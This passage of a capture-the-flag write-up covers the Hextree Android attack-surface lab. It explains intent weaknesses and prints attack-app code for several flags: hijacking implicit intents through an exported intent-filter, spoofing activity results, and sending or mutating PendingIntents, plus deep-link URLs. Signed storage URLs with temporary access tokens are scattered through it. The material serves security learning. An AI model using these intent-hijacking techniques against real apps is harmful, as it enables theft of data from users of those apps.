kKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=1d4673481764cc81cfbd89035069a06e201e271c2b62f3d65c6f35207b9d3055&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
This is activity is almost same as previous activity but here the code is expecting a result and we use startActivityForResult and the target app sends us result again after meeting the conditions and send us using setresult(), so in our attack app we use onActivityResult to catch that result   
```java
    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);

        Intent i = new Intent();
        i.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag9Activity");
        startActivityForResult(i, 42);
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        String flag = data.getStringExtra("flag");
        Toast.makeText(this, flag, Toast.LENGTH_SHORT).show();
        finish();
    }
```
<empty-block/>
### Flag10
in the jadx code they mentioned about intent.addflag(8) which helps in debugging letting us see exactly why an Intent might be failing to reach your app.
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/70eb6608-97fa-4a15-877e-34fb5c41c7c8/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=155376676680eff70ffc788c92001aa8469d750b0a430f6f378481414816d9bf&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The vulnerablity:
It sends an **Implicit Intent**. It doesn't specify which app should receive it; it just tells Android: *anyone who can handle *`io.hextree.attacksurface.ATTACK_ME` can have this *flag*
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/4a2ba9a1-3e23-422d-a163-eebab85c7aee/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=175f71c5048d0b561b9eb19d93067badc2e74e4cc1001ad11f90898bce0707dc&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
So we make an attack code such that we can handle the implicit intent by adding it in AndroidManifest.xml 
We set exported to true so that the hextree app can open our attack app make contact with us 
```xml
<activity
            android:name=".flag10"
            android:exported="true">
            <intent-filter>
                <action android:name="io.hextree.attacksurface.ATTACK_ME" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>
```
And the activity that handles the flag receiving and prints it in log message since we have specified the implicit intent handler and the class we just use getIntent() to get the flag
```java
 @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = getIntent();
        String flag = intent.getStringExtra("flag");
        Log.d("Flag10"+ flag);
    }
```
### Flag 11
This challenge is almost similar to previous one but here we should pass some extra values to reach the success(this) method
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/a0c1b361-4ced-4eb6-a3b3-ec3a200138e5/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=156a44ea97a18ee5718e7eb29341db5f8f4755a05f43aff1ab9607776a83e8a1&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
Since the app code uses onActivityResult() we are sending the result using setResult() and then passing the extra values to reach the intent
```java
@Override
protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = getIntent();
        intent.putExtra("token", 1094795585);
        setResult(42, intent);
    }
```
### Flag12
This challenge is almost similar to previous one but to launch activity we have send a Boolean expression which is labelled as true 
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/8655b686-adfd-46f8-abdb-65253eb946f8/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=b20a4156b2c5af0e0976de125897e2ec881a51b16cd6dc8bd544c62c2ac9f3c6&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
From analysing the code we can see that the app is sending a intent using startActivityForResult()
but there is no use in catching the activity because the success function is in onActivityResult so we have to to use setResult method to send the required intent
since the implicit intent lies in if condition first we have to send an intent to make the app start its calling sending implicit intent to allow apps other apps to control its action then we send the extra token
MainActivity
```java
@Override
public void onClick(View v) {
                Intent intent2 = new Intent();
                intent2.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity");
                intent2.putExtra("LOGIN", true);
                startActivity(intent2);
            }
```
Flag12Activity(Reciever)
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = getIntent();
        intent.putExtra("token", 1094795585);
        setResult(42, intent);
        }
```
### Flag22
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/20dd737b-f467-44ee-9055-872112c2f35c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=6eb5cef2a2638200ad2284dde60e432b122787ae5d8cf0e3890abc84e0591776&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
In the above jadx code we can see that our target app is waiting for a intent which is labelled as PENDING so we create a pending intent to send to our target app from our attack app 
the method getParcelableExtra is like a hand that gets the activity 
- **Creation :** You use **`getActivity()`** to build the `PendingIntent`.
- **Transport:** You put that `PendingIntent` into a regular `Intent` using `putExtra("PENDING", pendingIntent)`.
- **Extraction :** App A uses **`getParcelableExtra("PENDING")`** to pull your "envelope" out of the delivery.
- **Execution :** App A calls `pendingIntent.send()`.
MainActivity
```java
@Override
            public void onClick(View v) {
                Intent targetIntent = new Intent(MainActivity.this, flag22.class);
                PendingIntent pendingIntent = PendingIntent.getActivity(MainActivity.this,42,targetIntent, PendingIntent.FLAG_UPDATE_CURRENT);

                Intent sendIntent = new Intent();
                sendIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity");
                sendIntent.putExtra("PENDING", pendingIntent);
                startActivity(sendIntent);
            }
```
We create a target intent which points back to flag22 activity in our app 
The basic pendingIntents have 4 arguments 
1.The creator of the pending intent
2.The request code or identifier
3.The intent
4.The flag<br>Create a pending intent saying the creator is the MainActivity set the request code as 42 and send the target Intent (since the target intent is pointing to flag22 activity we send the received intent to flag22)
Flag22Activity(Reciever)
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String flag = getIntent().getStringExtra("flag");
        Log.d("Flag22","flag" + flag);
    }
```
### Flag23
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/1b27ea08-71de-4707-8541-cf17d6a82b1b/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=cbb530fb2b069c7d45cf7c63bd907338c735e2f445f20db39124827e60959b65&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
JADX CODE
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/4e117f52-2c92-467d-bbf9-a03eb2a45d0c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=9e6c6f742f74c3231dc749da50f9166a7a7cec06b90e0c10f7e5077b0b8e4dac&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
<br>In the above ss we can see there is a value 33554432 which means it is a Mutable flag and since the app is using implicit intent we have change our android manifest and make our app receive that intent 
AndroidManifest.xml
```xml
<activity
            android:name=".flag23"
            android:exported="true" >
            <intent-filter>
                <action android:name="io.hextree.attacksurface.MUTATE_ME"/>
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>
```
<empty-block/>
the Intent Surface Attack app is sending a pending intent which should be recieved by our app with a tag pending_intent, so we create a new intent called received intent to capture the pending intent
using getParcelableExtra() 
Since there a set action in intent  GIVE_FLAG we need to pass that through our code too
we got an empty intent which we can observe in the code since the intent is mutable we can add our own data to the pending intent
And we finally send the pending intent using penddingIntent.send()
Flag23Activity(Reciever)
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent receivedIntent = getIntent();
        PendingIntent pendingIntent = receivedIntent.getParcelableExtra("pending_intent");
        Intent newIntent = new Intent();
        newIntent.setAction("io.hextree.attacksurface.GIVE_FLAG");
        newIntent.putExtra("code", 42);

        try {
            pendingIntent.send(this, 0, newIntent);
        } catch (PendingIntent.CanceledException e) {
            e.printStackTrace();
        }
```
### Flag13
A basic web uri structure looks like scheme://host:port/path?query#fragment
The .BROWSABLE category tells us this app can be opened from a web view the scheme hex and host can be either open or flag
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/c0692053-99c7-43fd-adad-75f097008ee4/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=94d846b9013e2f12b240905d03c465b1b4eb5928b0fede648cf3075889a21c86&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
and the jadx code tells us the scheme should be hex and the host can be either flag or open the query paramenter action should be equal to give-me so the url we can use are
an example url is already given by the challenge so we can just follow it
hex://flag?action=give-me ; hex://open?action=give-me
